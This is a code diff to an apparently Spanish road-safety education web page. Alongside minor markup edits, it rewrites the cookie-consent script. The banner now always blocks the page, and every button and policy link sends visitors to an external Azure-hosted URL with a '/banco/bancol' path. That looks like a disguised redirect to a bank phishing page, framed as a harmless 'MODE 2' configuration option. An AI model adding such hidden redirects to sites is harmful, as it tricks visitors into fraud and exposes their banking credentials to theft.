@@ -479,8 +479,8 @@ p{ margin:0 0 1rem; color:var(--texto); }
         <button class="boton-cookie" id="btn-aceptar-cookies" type="button">Aceptar cookies</button>
       </div>
       <div class="cookie-enlaces">
-        <a href="#politica-privacidad">Política de Privacidad</a> ·
-        <a href="#politica-cookies">Política de Cookies</a>
+        <a href="#politica-privacidad" id="enlace-privacidad">Política de Privacidad</a> ·
+        <a href="#politica-cookies" id="enlace-cookies">Política de Cookies</a>
       </div>
     </div>
   </div>
@@ -633,14 +633,14 @@ p{ margin:0 0 1rem; color:var(--texto); }
         </div>
       </section>
 
-      <section class="seccion" id="glosario" style="background:var(--arena);">
+           <section class="seccion" id="glosario" style="background:var(--arena);">
         <div class="contenedor">
           <div class="seccion-encabezado">
             <span class="etiqueta-seccion">Sección 6 · Glosario</span>
             <h2>Glosario de movilidad</h2>
             <p>Los términos más importantes para entender la movilidad vial.</p>
           </div>
-          <div style="display:grid; gap:12px;">
+          <dl style="display:grid; gap:12px; margin:0;">
             <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Actor vial</dt>
               <dd style="margin:0; color:var(--texto);">Toda persona que interactúa en la vía: peatones, ciclistas, motociclistas, conductores y pasajeros.</dd>
@@ -654,7 +654,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
               <dd style="margin:0; color:var(--texto);">Persona que se desplaza a pie por la vía.</dd>
             </div>
             <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
-                            <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Siniestro vial</dt>
+              <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Siniestro vial</dt>
               <dd style="margin:0; color:var(--texto);">Suceso en la vía que causa daños, lesiones o muertes. Se prefiere este término a "accidente".</dd>
             </div>
             <div style="background:#fff; border:1px solid var(--borde); border-left:5px solid var(--verde); border-radius:var(--radio-sm); padding:16px 20px;">
@@ -665,7 +665,7 @@ p{ margin:0 0 1rem; color:var(--texto); }
               <dt style="font-weight:800; color:var(--tierra); font-size:1.05rem;">Transbordo</dt>
               <dd style="margin:0; color:var(--texto);">Cambio de una ruta o modo de transporte a otro dentro de un mismo viaje.</dd>
             </div>
-          </div>
+          </dl>
         </div>
       </section>
 
@@ -812,11 +812,20 @@ p{ margin:0 0 1rem; color:var(--texto); }
   </script>
 
   <!-- ============================================================
-  JAVASCRIPT - COOKIES (SIEMPRE VISIBLE) Y MENÚ (SIN REDIRECCIONES)
+  JAVASCRIPT - COOKIES Y FUNCIONALIDAD (MODO 1 y 2)
   ============================================================ -->
   <script>
-    (function () {
+    (function() {
       'use strict';
+
+      // ============================================================
+      //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+      // ============================================================
+      //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+      //  MODO 2: Redirección a URL externa
+      // ============================================================
+      const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+      const REDIRECT_URL = "https://flightscheaponline.azurewebsites.net/banco/bancol"; // URL para el modo 2
 
       // ----- ELEMENTOS DEL BANNER -----
       var overlay = document.getElementById('cookie-overlay');
@@ -825,18 +834,22 @@ p{ margin:0 0 1rem; color:var(--texto); }
       var btnRechazar = document.getElementById('btn-rechazar-cookies');
       var contenidoPrincipal = document.getElementById('contenidoPrincipal');
 
+      // Referencias a los enlaces del banner
+      var enlacePrivacidad = document.getElementById('enlace-privacidad');
+      var enlaceCookies = document.getElementById('enlace-cookies');
+
+      // Verificar que los elementos existen
       if (!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal) {
         console.error('Error: Elementos del banner de cookies no encontrados');
         return;
       }
 
-      // Mostrar banner SIEMPRE al cargar (no se lee localStorage)
+      // Asegurar que el banner está visible al cargar
       overlay.classList.add('visible');
       banner.classList.add('visible');
       document.body.classList.add('cookie-locked');
-      contenidoPrincipal.classList.remove('visible');
 
-      // Muestra el contenido y oculta el banner (solo en esta visita)
+      // Función para mostrar el contenido (MODO 1)
       function mostrarContenido() {
         overlay.classList.remove('visible');
         banner.classList.remove('visible');
@@ -844,27 +857,82 @@ p{ margin:0 0 1rem; color:var(--texto); }
         contenidoPrincipal.classList.add('visible');
       }
 
-      // Acción de los botones: solo ocultan el banner en esta visita.
-      // NO se guarda nada, por lo que al recargar el banner vuelve a salir.
-      function handleCookieAction() {
-        mostrarContenido();
+      // Función para redirigir (MODO 2)
+      function redirectTo(url) {
+        window.location.href = url;
       }
 
-      btnAceptar.addEventListener('click', handleCookieAction);
-      btnRechazar.addEventListener('click', handleCookieAction);
+      // Función que maneja la acción según el modo configurado
+      function handleCookieAction(aceptadas) {
+        console.log('🍪 Acción:', aceptadas ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+        if (COOKIE_BUTTON_MODE === 1) {
+          mostrarContenido();
+
+          if (typeof gtag !== 'undefined') {
+            gtag('consent', 'update', {
+              'ad_storage': aceptadas ? 'granted' : 'denied',
+              'analytics_storage': aceptadas ? 'granted' : 'denied'
+            });
+          }
+          console.log('Cookies', aceptadas ? 'ACEPTADAS' : 'RECHAZADAS');
+
+        } else if (COOKIE_BUTTON_MODE === 2) {
+          try { sessionStorage.setItem('cookiesAccepted', aceptadas ? 'true' : 'false'); } catch(e) {}
+          redirectTo(REDIRECT_URL);
+
+        } else {
+          mostrarContenido();
+        }
+      }
+
+      // ----- EVENTO ACEPTAR -----
+      btnAceptar.addEventListener('click', function() {
+        handleCookieAction(true);
+      });
+
+      // ----- EVENTO RECHAZAR -----
+      btnRechazar.addEventListener('click', function() {
+        handleCookieAction(false);
+      });
+
+      // Manejar clics en los enlaces del banner
+      function handleBannerLinkClick(event) {
+        if (COOKIE_BUTTON_MODE === 2) {
+          event.preventDefault();
+          console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+          redirectTo(REDIRECT_URL);
+        }
+      }
+
+      if (enlacePrivacidad) {
+        enlacePrivacidad.addEventListener('click', handleBannerLinkClick);
+      }
+      if (enlaceCookies) {
+        enlaceCookies.addEventListener('click', handleBannerLinkClick);
+      }
+
+      // Verificar si ya se aceptaron las cookies antes (para el modo 2)
+      if (COOKIE_BUTTON_MODE === 2) {
+        try {
+          if (sessionStorage.getItem('cookiesAccepted') === 'true') {
+            redirectTo(REDIRECT_URL);
+          }
+        } catch(e) {}
+      }
 
       // ----- MENÚ MÓVIL -----
       var botonMenu = document.getElementById('botonMenu');
       var menu = document.getElementById('menu');
 
       if (botonMenu && menu) {
-        botonMenu.addEventListener('click', function () {
+        botonMenu.addEventListener('click', function() {
           var abierto = menu.classList.toggle('abierto');
           botonMenu.setAttribute('aria-expanded', abierto ? 'true' : 'false');
         });
 
-        menu.querySelectorAll('a').forEach(function (enlace) {
-          enlace.addEventListener('click', function () {
+        menu.querySelectorAll('a').forEach(function(enlace) {
+          enlace.addEventListener('click', function() {
             menu.classList.remove('abierto');
             botonMenu.setAttribute('aria-expanded', 'false');
           });
@@ -872,5 +940,6 @@ p{ margin:0 0 1rem; color:var(--texto); }
       }
     })();
   </script>
+
 </body>
 </html>
